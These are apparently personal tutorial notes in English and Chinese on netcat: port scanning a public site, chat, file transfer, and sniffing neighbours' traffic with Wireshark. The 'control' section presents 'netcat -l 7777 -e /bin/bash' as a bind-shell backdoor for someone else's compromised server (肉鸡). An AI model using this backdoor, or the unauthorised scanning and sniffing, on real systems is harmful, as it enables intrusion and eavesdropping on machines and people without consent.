# netcat introduction

<!-- TOC -->

- [netcat introduction](#netcat-introduction)
    - [scan port](#scan-port)
    - [instant message](#instant-message)
    - [simple download file](#simple-download-file)
    - [control](#control)
    - [package capture](#package-capture)

<!-- /TOC -->


## scan port

**nc=netcat**

scan port: `nc -z -v -w 1  www.baidu.com 70-90`

```bash
# output
nc: connect to www.itcast.cn port 78 (tcp) timed out: Operation now in progress
nc: connect to www.itcast.cn port 79 (tcp) timed out: Operation now in progress
Connection to www.itcast.cn 80 port [tcp/http] succeeded!
nc: connect to www.itcast.cn port 81 (tcp) timed out: Operation now in progress
nc: connect to www.itcast.cn port 82 (tcp) timed out: Operation now in progress
```

send information:

```bash
grey@GreyAli:~$ nc -v www.itcast.cn 80
Connection to www.itcast.cn 80 port [tcp/http] succeeded!
hello
```

```bash
# output
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head><title>400 Bad Request</title></head>
<body bgcolor="white">
<h1>400 Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<hr/>Powered by Tengine</body>
</html>
```

## instant message

```bash
# 局域网即时通讯
# server
nc -l 9999

# client
nc server_ip 9999

# 然后就可以互相发消息了
```

## simple download file

```bash
# server
nc -l 9999 < my_file.txt

# client
nc server_ip 9999 > new_file.txt
```

## control

`netcat`分两个版本: OpenBSD, GNU. 一般的Linux都是OpenBSD的netcat, 为了安全, 没有`-e`参数来执行命令

所以要使用GNU的netcat来肉鸡: [GNU netcat](http://netcat.sourceforge.net/)

```bash
# download
./configure
make
sudo make install
```

```bash
# server(肉鸡): 关键是在别人的服务器上安装GNU netcat
netcat -l 7777 -e /bin/bash

# client(攻击者): 然后可以执行各种命令
netcat server_ip 7777
``` 

## package capture

同一个路由器可以用wireshark, capture其他人的包;
> 只不过需要指定ip而已